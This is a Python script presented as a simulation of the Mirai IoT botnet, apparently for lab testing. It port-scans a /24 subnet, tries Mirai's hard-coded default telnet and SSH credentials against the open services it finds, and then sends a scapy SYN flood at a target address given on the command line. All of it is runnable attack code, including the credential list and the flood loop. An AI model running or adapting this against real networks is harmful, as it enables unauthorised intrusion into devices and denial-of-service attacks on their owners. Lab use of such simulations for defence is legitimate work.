#!/usr/bin/env python3
"""
Mirai-style IoT botnet simulation. Reproduces the three Mirai phases:
  1. Scan the subnet for open telnet/ssh (parallel — ~5s for a /24)
  2. Brute-force with Mirai's built-in default-credential list
  3. Launch a flood from the "infected bot"

Usage: python mirai_sim.py [flood_target] [--flood-secs N] [--workers N]
Default: flood_target=192.168.1.195, workers=200
"""
import sys, socket, time
from concurrent.futures import ThreadPoolExecutor, as_completed
from scapy.all import IP, TCP, RandShort, conf

SUBNET = "192.168.1."
SCAN_PORTS = [22, 23, 80, 1883, 2323, 8080]   # SSH, Telnet, HTTP, MQTT, Telnet-alt, HTTP-alt

# Mirai's actual hard-coded default credentials (representative subset)
MIRAI_CREDS = [
    ("root", "xc3511"), ("root", "vizxv"), ("root", "admin"), ("admin", "admin"),
    ("root", "888888"), ("root", "root"), ("root", "12345"), ("root", "54321"),
    ("root", "default"), ("root", "juantech"), ("admin", "admin123"),
    ("root", "toor"), ("admin", "password"), ("guest", "guest"),
    ("admin", ""), ("root", ""), ("user", "user"), ("root", "pass"),
]

# ── arg parsing ────────────────────────────────────────────────────────────
flood_target = "192.168.1.195"
flood_secs   = 15
workers      = 200

args = sys.argv[1:]
i = 0
while i < len(args):
    a = args[i]
    if a == "--flood-secs":
        flood_secs = int(args[i + 1]); i += 2
    elif a == "--workers":
        workers = int(args[i + 1]); i += 2
    elif not a.startswith("--"):
        flood_target = a; i += 1
    else:
        i += 1


def tcp_open(ip, port, timeout=0.20):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect((ip, port)); s.close(); return True
    except Exception:
        return False


def _probe(ip_port):
    ip, port = ip_port
    return (ip, port, tcp_open(ip, port))


def phase1_scan():
    t0 = time.time()
    print(f"[mirai] PHASE 1 — parallel scan of 192.168.1.0/24 "
          f"({len(SCAN_PORTS)} ports, {workers} workers) ...", flush=True)
    probes = [(SUBNET + str(i), port)
              for i in range(1, 255)
              for port in SCAN_PORTS]
    targets = []
    with ThreadPoolExecutor(max_workers=workers) as pool:
        for fut in as_completed(pool.submit(_probe, p) for p in probes):
            ip, port, ok = fut.result()
            if ok:
                print(f"[mirai]   FOUND open {ip}:{port}", flush=True)
                targets.append((ip, port))
    dt = time.time() - t0
    print(f"[mirai]   scan complete in {dt:.1f}s — "
          f"{len(targets)} open services discovered", flush=True)
    return targets


def phase2_brute(targets):
    print("[mirai] PHASE 2 — default-credential brute force ...", flush=True)
    # Only brute the auth-bearing services that Mirai actually attacks
    auth_ports = {22, 23, 2323}
    for ip, port in targets:
        if port not in auth_ports:
            continue
        for user, pw in MIRAI_CREDS:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1.0)
            try:
                s.connect((ip, port))
                s.send(f"{user}\r\n{pw}\r\n".encode())
                try: s.recv(128)
                except Exception: pass
                s.close()
            except Exception:
                pass
        print(f"[mirai]   tried {len(MIRAI_CREDS)} cred pairs against {ip}:{port}", flush=True)


def phase3_flood(target, secs):
    print(f"[mirai] PHASE 3 — botnet flood -> {target}:80 for {secs}s ...", flush=True)
    sock, end, n = conf.L3socket(), time.time() + secs, 0
    while time.time() < end:
        pkt = IP(dst=target)/TCP(sport=int(RandShort()), dport=80, flags="S")
        sock.send(pkt); n += 1
    print(f"[mirai]   flood sent {n} packets", flush=True)


if __name__ == "__main__":
    print("=" * 60, flush=True)
    print(f"[mirai] IoT botnet simulation starting (target={flood_target}, "
          f"flood={flood_secs}s, workers={workers})", flush=True)
    print("=" * 60, flush=True)
    found = phase1_scan()
    if found:
        phase2_brute(found)
    phase3_flood(flood_target, flood_secs)
    print("[mirai] simulation complete.", flush=True)
